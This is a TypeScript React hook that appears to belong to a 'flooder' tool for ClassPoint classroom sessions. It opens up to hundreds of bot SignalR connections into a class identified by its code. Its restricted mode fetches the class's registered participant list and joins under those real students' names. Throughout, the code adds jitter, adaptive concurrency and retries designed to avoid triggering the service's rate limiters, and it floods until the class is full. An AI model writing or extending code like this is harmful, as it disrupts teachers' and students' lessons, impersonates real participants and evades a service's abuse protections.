"use client";

import { useState, useCallback, useRef, useEffect } from "react";
import * as signalR from "@microsoft/signalr";
import type { ConnectionInfo, FlooderProgress, RetryState, FlooderMode, SavedParticipant } from "@/src/types";
import { generateUsername, generateParticipantId } from "@/src/utils";
import { API_ENDPOINTS, DEFAULT_NAME_PREFIX, CONNECTION_CONFIG, FLOODER_CONFIG, validateNamePrefix } from "@/src/config";
import { flooderLogger as logger } from "@/src/logger";

interface ClassInfo {
  presenterEmail: string;
  cpcsRegion: string;
}

interface UseFlooderOptions {
  namePrefix?: string;
  mode?: FlooderMode;
  excludedNames?: string[];
}

interface UseFlooderReturn {
  connections: ConnectionInfo[];
  isConnecting: boolean;
  error: string | null;
  progress: FlooderProgress | null;
  connect: (classCode: string, numConnections: number) => Promise<void>;
  disconnect: (connectionId?: number) => Promise<void>;
  disconnectAll: () => Promise<void>;
  clearError: () => void;
}

/**
 * Min time between UI updates in ms to prevent freezing
 */
const UI_UPDATE_THROTTLE_MS = 100;

/**
 * Circular buffer for O(1) sliding window health tracking
 */
class HealthTracker {
  private readonly buffer: boolean[];
  private readonly size: number;
  private head = 0;
  private count = 0;
  private successCount = 0;
  private latencies: number[] = [];
  private readonly latencyWindowSize = 10;

  constructor(windowSize: number = FLOODER_CONFIG.HEALTH_WINDOW_SIZE) {
    this.size = windowSize;
    this.buffer = new Array(windowSize);
  }

  record(success: boolean, latencyMs?: number): void {
    // Remove old value from success count if buffer is full
    if (this.count === this.size) {
      if (this.buffer[this.head]) {
        this.successCount--;
      }
    } else {
      this.count++;
    }

    // Add new value
    this.buffer[this.head] = success;
    if (success) {
      this.successCount++;
    }

    // Move head (circular)
    this.head = (this.head + 1) % this.size;

    // Track latency for slowdown detection
    if (latencyMs !== undefined) {
      this.latencies.push(latencyMs);
      if (this.latencies.length > this.latencyWindowSize) {
        this.latencies.shift();
      }
    }
  }

  getSuccessRate(): number {
    if (this.count === 0) return 1;
    return this.successCount / this.count;
  }

  /**
   * Detect if connections are slowing down (early throttle warning)
   */
  isSlowingDown(): boolean {
    if (this.latencies.length < 4) return false;
    
    // Compare recent avg to earlier avg
    const mid = Math.floor(this.latencies.length / 2);
    const earlyAvg = this.latencies.slice(0, mid).reduce((a, b) => a + b, 0) / mid;
    const recentAvg = this.latencies.slice(mid).reduce((a, b) => a + b, 0) / (this.latencies.length - mid);
    
    // If recent connections are 2x slower, we're likely being throttled
    return recentAvg > earlyAvg * 2;
  }

  getAverageLatency(): number {
    if (this.latencies.length === 0) return 0;
    return this.latencies.reduce((a, b) => a + b, 0) / this.latencies.length;
  }

  reset(): void {
    this.head = 0;
    this.count = 0;
    this.successCount = 0;
    this.buffer.fill(false);
    this.latencies = [];
  }
}

/**
 * O(1) retry queue using Map
 */
class RetryQueue {
  private readonly items = new Map<number, RetryState>();

  add(id: number, retries: number, nextRetryAt: number): void {
    this.items.set(id, { id, retries, nextRetryAt });
  }

  get(id: number): RetryState | undefined {
    return this.items.get(id);
  }

  has(id: number): boolean {
    return this.items.has(id);
  }

  update(id: number, retries: number, nextRetryAt: number): void {
    this.items.set(id, { id, retries, nextRetryAt });
  }

  remove(id: number): void {
    this.items.delete(id);
  }

  getReady(now: number): RetryState[] {
    const ready: RetryState[] = [];
    for (const item of this.items.values()) {
      if (item.nextRetryAt <= now) {
        ready.push(item);
      }
    }
    return ready;
  }

  getNextRetryTime(): number | null {
    let min: number | null = null;
    for (const item of this.items.values()) {
      if (min === null || item.nextRetryAt < min) {
        min = item.nextRetryAt;
      }
    }
    return min;
  }

  get size(): number {
    return this.items.size;
  }

  clear(): void {
    this.items.clear();
  }
}

/**
 * Connection error types for intelligent retry handling
 */
type ConnectionErrorType = 'rate_limit' | 'server_overload' | 'timeout' | 'network' | 'auth' | 'class_full' | 'unknown';

/**
 * Classifies connection errors for appropriate retry handling
 */
function classifyError(error: unknown): { type: ConnectionErrorType; message: string } {
  const msg = (error instanceof Error ? error.message : String(error)).toLowerCase();

  // Class full - hard limit, stop all attempts
  if (msg.includes('class_is_full') || msg.includes('class is full') ||
      msg.includes('class full') || msg.includes('session is full') ||
      msg.includes('maximum participants') || msg.includes('participant limit')) {
    return { type: 'class_full', message: msg };
  }

  // Rate limiting - true 429 responses
  if (msg.includes('429') || msg.includes('too many') || msg.includes('rate limit')) {
    return { type: 'rate_limit', message: msg };
  }

  // Server overload - temporary, retry quickly
  if (msg.includes('503') || msg.includes('service unavailable')) {
    return { type: 'server_overload', message: msg };
  }

  // Timeout - NOT rate limiting, use different strategy
  if (msg.includes('timeout') || msg.includes('timed out') || msg.includes('etimedout')) {
    return { type: 'timeout', message: msg };
  }

  // Network errors - DNS, socket issues
  if (msg.includes('econnrefused') || msg.includes('enotfound') ||
      msg.includes('network') || msg.includes('socket') ||
      msg.includes('dns') || msg.includes('econnreset')) {
    return { type: 'network', message: msg };
  }

  // Auth errors - don't retry
  if (msg.includes('401') || msg.includes('403') || msg.includes('unauthorized')) {
    return { type: 'auth', message: msg };
  }

  return { type: 'unknown', message: msg };
}

/**
 * Calculate backoff based on error type (different strategies)
 */
function calculateTypedBackoff(errorType: ConnectionErrorType, retryCount: number): number {
  switch (errorType) {
    case 'rate_limit':
      // Exponential backoff with longer base for rate limits
      const rateLimitDelay = 2000 * Math.pow(2, retryCount - 1);
      return Math.min(rateLimitDelay + Math.random() * 1000, 15000);

    case 'server_overload':
      // Brief delay, server might recover quickly
      return 1000 + Math.random() * 500;

    case 'timeout':
      // Linear backoff - timeouts often resolve themselves
      const timeoutDelay = 500 * retryCount;
      return Math.min(timeoutDelay + Math.random() * 300, 3000); // Cap at 3s

    case 'network':
      // Quick retry with jitter
      return 200 + Math.random() * 300;

    case 'unknown':
    default:
      // Conservative exponential
      return calculateBackoff(retryCount);
  }
}

/**
 * Calculate exponential backoff with jitter
 */
function calculateBackoff(retryCount: number): number {
  const baseDelay = FLOODER_CONFIG.RETRY_DELAY_BASE;
  const exponentialDelay = baseDelay * Math.pow(2, retryCount - 1);
  const jitter = Math.random() * 0.3 * exponentialDelay; // 0-30% jitter
  return Math.min(exponentialDelay + jitter, FLOODER_CONFIG.RETRY_DELAY_MAX);
}

/**
 * Delay helper
 */
function delay(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Configuration for progress guarantees
 */
const PROGRESS_CONFIG = {
  /** Maximum time to wait before forcing progress (ms) */
  MAX_WAIT_TIME: 8000,
  /** Minimum connections to attempt per wave even when throttled */
  MIN_WAVE_SIZE: 3,
  /** Maximum consecutive waves without any success before escalating */
  MAX_FAILED_WAVES: 5,
};

/**
 * Ensures forward progress even during heavy throttling
 */
class ProgressGuarantee {
  private consecutiveFailedWaves = 0;
  private lastProgressTime = Date.now();

  recordWaveResult(hadSuccess: boolean): void {
    if (hadSuccess) {
      this.consecutiveFailedWaves = 0;
      this.lastProgressTime = Date.now();
    } else {
      this.consecutiveFailedWaves++;
    }
  }

  shouldForceProgress(): boolean {
    const timeSinceProgress = Date.now() - this.lastProgressTime;
    return timeSinceProgress > PROGRESS_CONFIG.MAX_WAIT_TIME ||
           this.consecutiveFailedWaves >= PROGRESS_CONFIG.MAX_FAILED_WAVES;
  }

  reset(): void {
    this.consecutiveFailedWaves = 0;
    this.lastProgressTime = Date.now();
  }
}

/**
 * Custom hook for managing ClassPoint flooder connections
 * Implements adaptive wave-based rate limiting for 500 bot support
 */
export function useFlooder({ namePrefix, mode = 'guest', excludedNames = [] }: UseFlooderOptions = {}): UseFlooderReturn {
  // UI State - decoupled from internal tracking
  const [connections, setConnections] = useState<ConnectionInfo[]>([]);
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [progress, setProgress] = useState<FlooderProgress | null>(null);

  // Mutable refs for high-speed tracking without re-renders
  const connectionsMap = useRef<Map<number, ConnectionInfo>>(new Map());
  const nextIdRef = useRef(1);
  const isConnectingRef = useRef(false);
  const isMountedRef = useRef(false);
  const pendingUpdatesRef = useRef(false);
  const abortControllerRef = useRef<AbortController | null>(null);
  const retryQueueRef = useRef<RetryQueue | null>(null);

  // Track component mount status
  useEffect(() => {
    isMountedRef.current = true;
    return () => {
      isMountedRef.current = false;
      // Abort any ongoing connection process
      abortControllerRef.current?.abort();
      // Clear retry queue
      retryQueueRef.current?.clear();
      // Cleanup all connections on unmount
      const conns = Array.from(connectionsMap.current.values());
      conns.forEach(c => c.connection.stop().catch(() => {}));
    };
  }, []);

  // Throttled UI updater
  useEffect(() => {
    const flushUpdates = () => {
      if (!isMountedRef.current) return;

      if (pendingUpdatesRef.current) {
        setConnections(Array.from(connectionsMap.current.values()));
        pendingUpdatesRef.current = false;
      }
    };

    const interval = setInterval(flushUpdates, UI_UPDATE_THROTTLE_MS);
    return () => clearInterval(interval);
  }, []);

  // Helper to schedule a UI update
  const scheduleUpdate = useCallback(() => {
    pendingUpdatesRef.current = true;
  }, []);

  /**
   * Create a single connection with timeout
   */
  const createConnection = useCallback(async (
    id: number,
    url: string,
    cpcsRegion: string,
    presenterEmail: string,
    username: string,
    abortSignal: AbortSignal
  ): Promise<{ id: number; success: boolean; rateLimited: boolean; latencyMs: number; errorType?: ConnectionErrorType; shouldRetry?: boolean }> => {
    const startTime = Date.now();
    const participantId = generateParticipantId();

    const connection = new signalR.HubConnectionBuilder()
      .withUrl(url, {
        transport: signalR.HttpTransportType.WebSockets,
        withCredentials: true,
      })
      .withAutomaticReconnect()
      .configureLogging(signalR.LogLevel.None)
      .build();

    const info: ConnectionInfo = {
      id,
      username,
      participantId,
      connection,
      status: "Connecting"
    };

    // Add to map immediately
    connectionsMap.current.set(id, info);
    scheduleUpdate();

    // Check abort before starting
    if (abortSignal.aborted) {
      connectionsMap.current.delete(id);
      return { id, success: false, rateLimited: false, latencyMs: Date.now() - startTime };
    }

    connection.on("SendJoinClass", () => {
      // Connection confirmed active
    });

    connection.onclose(() => {
      const current = connectionsMap.current.get(id);
      if (current) {
        current.status = "Disconnected";
        scheduleUpdate();
      }
    });

    connection.onreconnecting(() => {
      const current = connectionsMap.current.get(id);
      if (current) {
        current.status = "Connecting";
        scheduleUpdate();
      }
    });

    connection.onreconnected(() => {
      const current = connectionsMap.current.get(id);
      if (current) {
        current.status = "Connected";
        scheduleUpdate();
      }
    });

    try {
      // Race between connection and timeout/abort
      const connectionPromise = (async () => {
        await connection.start();
        await connection.send("Send", { protocol: "json", version: 1 });
        await connection.send("ParticipantStartup", {
          participantUsername: username,
          participantName: username,
          participantId: participantId,
          participantAvatar: "",
          cpcsRegion: cpcsRegion,
          presenterEmail: presenterEmail,
          classSessionId: "",
        });
        return true;
      })();

      const timeoutPromise = new Promise<boolean>((_, reject) => {
        setTimeout(() => reject(new Error("Connection timeout")), FLOODER_CONFIG.CONNECTION_TIMEOUT);
      });

      // FIX #1: Use { once: true } to auto-cleanup abort listener
      const abortPromise = new Promise<boolean>((_, reject) => {
        abortSignal.addEventListener("abort", () => reject(new Error("Aborted")), { once: true });
      });

      await Promise.race([connectionPromise, timeoutPromise, abortPromise]);

      const current = connectionsMap.current.get(id);
      if (current) {
        current.status = "Connected";
        scheduleUpdate();
      }
      return { id, success: true, rateLimited: false, latencyMs: Date.now() - startTime };

    } catch (err) {
      const current = connectionsMap.current.get(id);
      if (current) {
        current.status = "Error";
        scheduleUpdate();
      }

      // Classify error for appropriate handling
      const { type: errorType, message: errorMessage } = classifyError(err);

      // Only true rate limits trigger rate-limited response
      const isRateLimited = errorType === 'rate_limit';

      // Auth and class_full errors should not be retried
      const shouldRetry = errorType !== 'auth' && errorType !== 'class_full';

      logger.debug(`Bot ${id} failed: ${errorMessage}, type: ${errorType}, willRetry: ${shouldRetry}`);

      // Cleanup failed connection
      try {
        await connection.stop();
      } catch {
        // Ignore stop errors
      }
      connectionsMap.current.delete(id);

      return {
        id,
        success: false,
        rateLimited: isRateLimited,
        latencyMs: Date.now() - startTime,
        errorType,
        shouldRetry
      };
    }
  }, [scheduleUpdate]);

  /**
   * Main connection flow with adaptive wave-based rate limiting
   */
  const connect = useCallback(async (classCode: string, numConnections: number) => {
    if (isConnectingRef.current) return;

    const trimmedCode = classCode.trim();
    if (!trimmedCode) {
      setError("Class code is required");
      return;
    }

    if (numConnections < CONNECTION_CONFIG.MIN_CONNECTIONS || numConnections > CONNECTION_CONFIG.MAX_CONNECTIONS) {
      setError(`Number of connections must be between ${CONNECTION_CONFIG.MIN_CONNECTIONS} and ${CONNECTION_CONFIG.MAX_CONNECTIONS}`);
      return;
    }

    const effectivePrefix = namePrefix?.trim() || DEFAULT_NAME_PREFIX;
    const prefixValidation = validateNamePrefix(effectivePrefix);
    if (!prefixValidation.valid) {
      setError(prefixValidation.error ?? "Invalid name prefix");
      return;
    }

    isConnectingRef.current = true;
    setIsConnecting(true);
    setError(null);

    // Create abort controller for cancellation
    abortControllerRef.current = new AbortController();
    const abortSignal = abortControllerRef.current.signal;

    // Initialize progress
    const progressState: FlooderProgress = {
      totalRequested: numConnections,
      connected: 0,
      connecting: 0,
      failed: 0,
      retrying: 0,
      waveNumber: 0,
      currentConcurrency: FLOODER_CONFIG.INITIAL_CONCURRENCY,
      successRate: 1,
      isThrottled: false,
      estimatedTimeRemaining: null,
    };
    setProgress({ ...progressState });

    try {
      // Lookup class info
      const response = await fetch(
        `/api/classpoint/lookup?code=${encodeURIComponent(trimmedCode)}&mode=${mode}`
      );

      if (!response.ok) {
        const data = await response.json().catch(() => ({}));
        throw new Error(data.error || "Class not found");
      }

      const classInfo: ClassInfo = await response.json();
      const { cpcsRegion, presenterEmail } = classInfo;
      const url = API_ENDPOINTS.WEBSOCKET_URL(cpcsRegion);

      // Fetch saved participants if in restricted mode
      let savedParticipants: SavedParticipant[] = [];
      let actualNumConnections = numConnections;

      if (mode === 'restricted') {
        try {
          const participantsResponse = await fetch(
            `/api/classpoint/participants?region=${encodeURIComponent(cpcsRegion)}&email=${encodeURIComponent(presenterEmail)}`
          );

          if (!participantsResponse.ok) {
            throw new Error("Failed to fetch registered participants");
          }

          savedParticipants = await participantsResponse.json();

          if (savedParticipants.length === 0) {
            throw new Error("No registered participants found for this class. Use Guest mode instead.");
          }

          // Filter out excluded names (case-insensitive)
          const excludedSet = new Set(excludedNames.map(name => name.trim().toLowerCase()));
          const filteredParticipants = savedParticipants.filter(
            p => !excludedSet.has(p.participantName.toLowerCase())
          );

          if (filteredParticipants.length === 0) {
            throw new Error("All registered participants are excluded. Remove some exclusions or use Guest mode.");
          }

          savedParticipants = filteredParticipants;

          // In restricted mode, flood with ALL participants (ignore numConnections)
          actualNumConnections = savedParticipants.length;

          if (excludedNames.length > 0) {
            logger.info(`Restricted mode: Using ${actualNumConnections} registered participants (${excludedNames.length} excluded)`);
          } else {
            logger.info(`Restricted mode: Using all ${actualNumConnections} registered participants`);
          }
        } catch (err) {
          const errorMessage = err instanceof Error ? err.message : "Failed to fetch registered participants";
          setError(errorMessage);
          isConnectingRef.current = false;
          setIsConnecting(false);
          return;
        }
      }

      // Initialize adaptive controller state
      const healthTracker = new HealthTracker();
      const progressGuarantee = new ProgressGuarantee();
      let concurrency: number = FLOODER_CONFIG.INITIAL_CONCURRENCY;
      const retryQueue = new RetryQueue();
      retryQueueRef.current = retryQueue; // Store ref for cleanup
      const pending: number[] = [];

      // Map connection IDs to usernames
      const connectionUsernames = new Map<number, string>();

      // Prepare all connection IDs and assign usernames
      for (let i = 0; i < actualNumConnections; i++) {
        const connId = nextIdRef.current++;
        pending.push(connId);

        // Assign username based on mode
        const participant = savedParticipants[i];
        if (mode === 'restricted' && participant) {
          connectionUsernames.set(connId, participant.participantName);
        } else {
          connectionUsernames.set(connId, generateUsername(effectivePrefix));
        }
      }

      // Update progress with actual connection count
      progressState.totalRequested = actualNumConnections;

      const startTime = Date.now();
      let lastProgressUpdate = Date.now();
      let lastConnectedCount = 0;

      // Wave-based processing loop
      while ((pending.length > 0 || retryQueue.size > 0) && !abortSignal.aborted) {
        // STUCK DETECTION: If no progress in 30 seconds, something is wrong
        const timeSinceProgress = Date.now() - lastProgressUpdate;
        if (timeSinceProgress > 30000 && progressState.connected === lastConnectedCount) {
          logger.error(`STUCK DETECTED: No progress for ${timeSinceProgress}ms. Connected: ${progressState.connected}, Pending: ${pending.length}, Retrying: ${retryQueue.size}`);
          logger.error(`Clearing stuck state and attempting to continue...`);
          // Force clear retry queue and move forward
          const stuckCount = Math.min(pending.length, 10); // Take up to 10 from pending
          if (stuckCount > 0) {
            logger.warn(`Force-failing ${stuckCount} connections to break deadlock`);
            pending.splice(0, stuckCount);
            progressState.failed += stuckCount;
          }
          lastProgressUpdate = Date.now();
          lastConnectedCount = progressState.connected;
          continue;
        }
        progressState.waveNumber++;
        progressState.currentConcurrency = Math.round(concurrency);

        // Move ready retries back to pending
        const now = Date.now();
        const readyRetries = retryQueue.getReady(now);
        for (const retry of readyRetries) {
          pending.push(retry.id);
          retryQueue.remove(retry.id);
        }

        progressState.retrying = retryQueue.size;

        // Take a batch from pending (adaptive wave size when throttled)
        const effectiveWaveSize = progressState.isThrottled 
          ? Math.max(10, Math.floor(FLOODER_CONFIG.WAVE_SIZE / 2))
          : FLOODER_CONFIG.WAVE_SIZE;
        const batchSize = Math.min(effectiveWaveSize, pending.length);
        const batch = pending.splice(0, batchSize);

        if (batch.length === 0) {
          // Only retries remaining, wait for next retry window with escape hatch
          const nextRetryTime = retryQueue.getNextRetryTime();
          if (nextRetryTime !== null) {
            const rawWait = Math.max(100, nextRetryTime - Date.now());
            const waitTime = Math.min(rawWait, PROGRESS_CONFIG.MAX_WAIT_TIME);  // CAP THE WAIT

            // UI: Show we're waiting
            progressState.waitingForRetry = true;
            progressState.nextRetryIn = waitTime;
            progressState.statusMessage = `Waiting ${Math.round(waitTime/1000)}s for retry window...`;
            setProgress({ ...progressState });

            logger.info(`Waiting ${waitTime}ms for retry queue (${retryQueue.size} items, capped from ${rawWait}ms)`);
            await delay(waitTime);

            progressState.waitingForRetry = false;
            progressState.nextRetryIn = null;
            progressState.statusMessage = undefined;
            continue;
          }
          break;
        }

        const waveStartTime = Date.now();
        logger.info(`Wave ${progressState.waveNumber}: Processing ${batch.length} connections (concurrency: ${Math.round(concurrency)}, pending: ${pending.length}, retrying: ${retryQueue.size})`);

        // Process batch with current concurrency
        progressState.connecting = batch.length;
        setProgress({ ...progressState });

        type ConnectionResult = { id: number; success: boolean; rateLimited: boolean; latencyMs: number; errorType?: ConnectionErrorType; shouldRetry?: boolean };
        const pool = new Set<Promise<ConnectionResult>>();
        const results: ConnectionResult[] = [];
        const batchIds = [...batch]; // Track IDs for debugging

        for (const id of batch) {
          if (abortSignal.aborted) break;

          // RATE LIMIT AVOIDANCE: Add micro-jitter between connection starts
          // This prevents burst patterns that trigger rate limiters
          const microJitter = progressState.isThrottled
            ? Math.random() * 150  // More jitter when throttled
            : Math.random() * 50;   // Small jitter normally

          if (microJitter > 20) {
            await delay(microJitter);
          }

          // Get username for this connection
          const username = connectionUsernames.get(id) || generateUsername(effectivePrefix);

          const promise = createConnection(id, url, cpcsRegion, presenterEmail, username, abortSignal)
            .then(result => {
              results.push(result);
              return result;
            })
            .catch(error => {
              // CRITICAL FIX: Defensive error handling for unexpected rejections
              logger.error(`Unexpected promise rejection for bot ${id}:`, error);
              const fallbackResult = {
                id,
                success: false,
                rateLimited: false,
                latencyMs: 0,
                errorType: 'unknown' as const,
                shouldRetry: false
              };
              results.push(fallbackResult);
              return fallbackResult;
            })
            .finally(() => {
              // CRITICAL FIX: ALWAYS remove from pool, even on error
              pool.delete(promise);
            });
          pool.add(promise);

          // Wait if at concurrency limit
          if (pool.size >= concurrency) {
            await Promise.race(pool);
          }
        }

        // Wait for remaining batch to complete with timeout
        const BATCH_TIMEOUT = 60000; // 60 seconds max per batch
        const batchTimeoutPromise = new Promise<never>((_, reject) =>
          setTimeout(() => reject(new Error(`Batch timeout: ${pool.size} connections still pending`)), BATCH_TIMEOUT)
        );

        try {
          await Promise.race([Promise.all(pool), batchTimeoutPromise]);
          const waveDuration = Date.now() - waveStartTime;
          logger.info(`Wave ${progressState.waveNumber} completed in ${waveDuration}ms (${results.length}/${batch.length} results)`);

          // Verify all results received
          if (results.length !== batch.length) {
            logger.error(`MISSING RESULTS: Expected ${batch.length}, got ${results.length}`);
            const receivedIds = new Set(results.map(r => r.id));
            const missingIds = batchIds.filter(id => !receivedIds.has(id));
            logger.error(`Missing connection IDs: ${missingIds.join(', ')}`);
          }
        } catch (error) {
          const waveDuration = Date.now() - waveStartTime;
          logger.error(`Batch processing error after ${waveDuration}ms (${pool.size} connections pending):`, error);

          // Log which connections are stuck
          const receivedIds = new Set(results.map(r => r.id));
          const missingIds = batchIds.filter(connId => !receivedIds.has(connId));
          if (missingIds.length > 0) {
            logger.error(`Stuck connection IDs: ${missingIds.join(', ')}`);
          }

          // Force clear stuck promises
          if (pool.size > 0) {
            logger.warn(`Force-clearing ${pool.size} stuck promises from pool`);
            // Mark missing connections as failed
            progressState.failed += missingIds.length;
            pool.clear();
          }
        }

        // Check abort after batch (FIX #8: stop processing if aborted)
        if (abortSignal.aborted) {
          retryQueue.clear();
          break;
        }

        // Analyze batch results
        let successCount = 0;
        let rateLimitedCount = 0;
        let classFullDetected = false;

        for (const result of results) {
          healthTracker.record(result.success, result.latencyMs);

          if (result.success) {
            successCount++;
            progressState.connected++;
            // Update stuck detection tracking
            if (progressState.connected > lastConnectedCount) {
              lastConnectedCount = progressState.connected;
              lastProgressUpdate = Date.now();
            }
          } else {
            if (result.rateLimited) {
              rateLimitedCount++;
            }

            // Check for class full - this is a hard stop condition
            if (result.errorType === 'class_full') {
              classFullDetected = true;
              logger.error(`Class is full! Connected ${progressState.connected} bots before limit.`);
              progressState.statusMessage = 'Class is full - no more participants allowed';
            }

            // Check retry queue (O(1) with Map)
            // Skip retries for auth and class_full errors
            if (result.shouldRetry !== false) {
              const existingRetry = retryQueue.get(result.id);
              if (existingRetry) {
                if (existingRetry.retries < FLOODER_CONFIG.MAX_RETRIES) {
                  const backoffDelay = calculateTypedBackoff(result.errorType || 'unknown', existingRetry.retries + 1);
                  retryQueue.update(result.id, existingRetry.retries + 1, Date.now() + backoffDelay);
                } else {
                  // Max retries exceeded - mark as failed
                  progressState.failed++;
                  retryQueue.remove(result.id);
                }
              } else {
                // New failure - add to retry queue
                const backoffDelay = calculateTypedBackoff(result.errorType || 'unknown', 1);
                retryQueue.add(result.id, 1, Date.now() + backoffDelay);
              }
            } else {
              // Auth or class_full error - don't retry, mark as failed
              progressState.failed++;
            }
          }
        }

        // If class is full, abort everything
        if (classFullDetected) {
          logger.warn(`Class full detected - aborting ${pending.length} pending and ${retryQueue.size} retrying connections`);
          // Mark all remaining as failed
          progressState.failed += pending.length + retryQueue.size;
          pending.length = 0; // Clear pending
          retryQueue.clear(); // Clear retry queue
          setProgress({ ...progressState });
          // Set error message for user
          setError(`Class is full! Successfully connected ${progressState.connected} bots. The class has reached its participant limit.`);
          break; // Exit main loop
        }

        // Update progress
        progressState.connecting = 0;
        progressState.retrying = retryQueue.size;
        progressState.successRate = healthTracker.getSuccessRate();
        progressState.averageLatency = healthTracker.getAverageLatency();

        // Track wave success for progress guarantee
        progressGuarantee.recordWaveResult(successCount > 0);

        // Smarter throttle detection with hysteresis for smoother transitions
        const wasThrottled = progressState.isThrottled;
        const successRate = healthTracker.getSuccessRate();

        if (!wasThrottled) {
          // Not currently throttled - check if we should enter throttle state
          progressState.isThrottled =
            successRate < FLOODER_CONFIG.THROTTLE_THRESHOLD ||
            healthTracker.isSlowingDown();
        } else {
          // Currently throttled - check if we can exit (use RECOVERY threshold for hysteresis)
          progressState.isThrottled =
            successRate < FLOODER_CONFIG.RECOVERY_THRESHOLD &&
            healthTracker.isSlowingDown();
        }

        // Log state transitions
        if (wasThrottled !== progressState.isThrottled) {
          if (progressState.isThrottled) {
            logger.warn(`Entering throttle state: success rate ${(successRate * 100).toFixed(0)}%`);
            progressState.statusMessage = 'Rate limiting detected - reducing speed';
          } else {
            logger.info(`Exiting throttle state: success rate recovered to ${(successRate * 100).toFixed(0)}%`);
            progressState.statusMessage = 'Recovery detected - resuming normal speed';
          }
        }

        // Estimate time remaining
        const elapsed = Date.now() - startTime;
        const completed = progressState.connected + progressState.failed;
        if (completed > 0) {
          const avgTimePerConnection = elapsed / completed;
          const remaining = Math.max(0, progressState.totalRequested - completed);
          progressState.estimatedTimeRemaining = avgTimePerConnection * remaining;
        }

        setProgress({ ...progressState });

        // Adaptive concurrency adjustment with progressive ramp-up
        if (successRate >= FLOODER_CONFIG.HEALTHY_THRESHOLD && !progressState.isThrottled) {
          // Progressive scaling: slower at start, faster once proven
          const scaleFactor = progressState.waveNumber < 3 ? 1.15 : 1.3;
          const newConcurrency = Math.min(concurrency * scaleFactor, FLOODER_CONFIG.MAX_CONCURRENCY);
          if (newConcurrency > concurrency) {
            logger.info(`Healthy (${(successRate * 100).toFixed(0)}%) - increasing concurrency: ${Math.round(concurrency)} → ${Math.round(newConcurrency)}`);
            concurrency = newConcurrency;
          }
        } else if (progressState.isThrottled) {
          // In throttle state - use more conservative reduction
          const reductionFactor = rateLimitedCount > 0 ? 0.4 : 0.6; // Faster reduction if rate limited
          const newConcurrency = Math.max(concurrency * reductionFactor, FLOODER_CONFIG.MIN_CONCURRENCY);
          if (newConcurrency < concurrency) {
            const reason = rateLimitedCount > 0 ? 'rate limiting' :
                          healthTracker.isSlowingDown() ? 'slowdown' : 'low success rate';
            logger.warn(`Throttled (${(successRate * 100).toFixed(0)}%, ${reason}) - decreasing concurrency: ${Math.round(concurrency)} → ${Math.round(newConcurrency)}`);
            concurrency = newConcurrency;
          }

          // Smarter cooldown - only for true rate limits with UI countdown
          if (rateLimitedCount > batch.length * 0.3) {
            // Scale cooldown based on severity
            const severity = rateLimitedCount / batch.length;
            const cooldown = Math.floor(FLOODER_CONFIG.WAVE_DELAY * (1 + severity * 2));

            progressState.inCooldown = true;
            progressState.cooldownRemaining = cooldown;
            progressState.statusMessage = `Heavy rate limiting (${rateLimitedCount}/${batch.length}) - cooling down`;
            setProgress({ ...progressState });

            logger.warn(`Heavy rate limiting detected (${rateLimitedCount}/${batch.length}), cooling down for ${cooldown}ms`);

            // Countdown the cooldown for UI
            const cooldownStart = Date.now();
            while (Date.now() - cooldownStart < cooldown && !abortSignal.aborted) {
              await delay(500);
              progressState.cooldownRemaining = Math.max(0, cooldown - (Date.now() - cooldownStart));
              setProgress({ ...progressState });
            }

            progressState.inCooldown = false;
            progressState.cooldownRemaining = undefined;
          }
        } else if (wasThrottled && !progressState.isThrottled) {
          // Just recovered - gentle ramp up
          const recoveryTarget = FLOODER_CONFIG.INITIAL_CONCURRENCY;
          if (concurrency < recoveryTarget) {
            concurrency = Math.min(concurrency * 1.2, recoveryTarget);
            logger.info(`Recovery ramp-up: concurrency → ${Math.round(concurrency)}`);
          }
        }

        // Brief delay between waves (unless last wave)
        if ((pending.length > 0 || retryQueue.size > 0) && !abortSignal.aborted) {
          // Adaptive wave delay: longer when throttled
          const waveDelay = progressState.isThrottled 
            ? FLOODER_CONFIG.WAVE_DELAY * 1.5 
            : FLOODER_CONFIG.WAVE_DELAY;
          await delay(waveDelay);
        }
      }

      // Final stats
      logger.info(
        `Flooding complete: ${progressState.connected}/${progressState.totalRequested} connected, ` +
        `${progressState.failed} failed, ${progressState.waveNumber} waves`
      );

    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : "Connection failed";
      setError(errorMessage);
      logger.error("Connection flow error:", err);
    } finally {
      if (isMountedRef.current) {
        isConnectingRef.current = false;
        setIsConnecting(false);
        abortControllerRef.current = null;
        retryQueueRef.current = null;

        // Final progress update
        setProgress(prev => prev ? { ...prev, connecting: 0, retrying: 0 } : null);
      }
    }
  }, [namePrefix, mode, excludedNames, createConnection]); // Include mode and excludedNames in deps

  const disconnect = useCallback(async (connectionId?: number) => {
    if (connectionId === undefined) return;

    const conn = connectionsMap.current.get(connectionId);
    if (conn) {
      await conn.connection.stop().catch(() => {});
      connectionsMap.current.delete(connectionId);
      scheduleUpdate();
    }
  }, [scheduleUpdate]);

  const disconnectAll = useCallback(async () => {
    // Abort any ongoing connection process
    abortControllerRef.current?.abort();
    
    // FIX #8: Clear retry queue on disconnect
    retryQueueRef.current?.clear();

    const allConns = Array.from(connectionsMap.current.values());

    // Clear map immediately so UI feels responsive
    connectionsMap.current.clear();
    scheduleUpdate();
    setProgress(null);

    // Stop connections in background
    await Promise.allSettled(
      allConns.map(c => c.connection.stop().catch(() => {}))
    );
  }, [scheduleUpdate]);

  const clearError = useCallback(() => setError(null), []);

  return {
    connections,
    isConnecting,
    error,
    progress,
    connect,
    disconnect,
    disconnectAll,
    clearError,
  };
}
